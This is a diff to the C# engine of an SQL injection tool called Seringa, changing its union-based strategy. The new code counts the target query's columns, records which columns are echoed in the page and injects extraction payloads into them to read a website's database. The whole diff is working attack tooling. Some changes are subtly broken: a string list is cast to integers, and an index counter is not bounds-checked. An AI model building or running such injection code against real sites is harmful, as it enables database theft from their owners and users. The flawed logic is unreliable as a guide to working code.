@@ -77,6 +77,10 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
         #region Private
         #region Fields
+        /// <summary>
+        /// not all columns might appear in the page html, indexes of those that do get stored here
+        /// </summary>
+        IList<int> _columnIndexes = new List<int>();
         int _maxCols = 20;
         int _nrCols = 0;
         #endregion Fields
@@ -96,20 +100,19 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
             for (int i = 0; i < _maxCols; i++)
             {
-                for(int j=0;j<i;j++)
-                {
-                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,j);
-                    if(j < i - 1)
-                        sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,",");
-                }
+                if(i > 0)
+                    sbCurExploit.Append(",");
+                sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,i); 
 
-                query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, string.Format(PayloadDetails.Payload, sbCurExploit.ToString()));
+                query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
                 pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
                 if (pageHtml.Contains(GeneralPayloads.UnionBasedErrorMessage))
                     continue;
                 else
                 {
                     _nrCols = i;
+                    var stringResults = HtmlHelpers.GetMultipleAnswersFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);
+                    _columnIndexes = stringResults.Where(r => !string.IsNullOrEmpty(r)).Cast<int>().ToList();
                     result = true;
                     break;
                 }
@@ -154,10 +157,10 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
             {
                 sbCurExploit.AppendFormat(j.ToString());
                 if (j < _nrCols - 1)
-                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue, ",");
+                    sbCurExploit.Append(",");
             }
 
-            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, string.Format(PayloadDetails.Payload, sbCurExploit.ToString()));
+            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
 
             var result = HtmlHelpers.GetAnswerFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);
@@ -179,7 +182,25 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
             if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
                 generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom);
 
-            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedPayload);
+            StringBuilder sbCurExploit = new StringBuilder();
+            
+            int columnIndexCounter = 0;
+
+            for (int j = 0; j < _nrCols; j++)
+            {
+                if (j == _columnIndexes[columnIndexCounter])
+                {
+                    sbCurExploit.AppendFormat(generatedPayload);
+                    columnIndexCounter++;
+                }
+                else
+                    sbCurExploit.AppendFormat(j.ToString());
+                
+                if (j < _nrCols - 1)
+                    sbCurExploit.Append(",");
+            }
+
+            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             IList<string> resultsBatch = HtmlHelpers.GetMultipleAnswersFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);
 
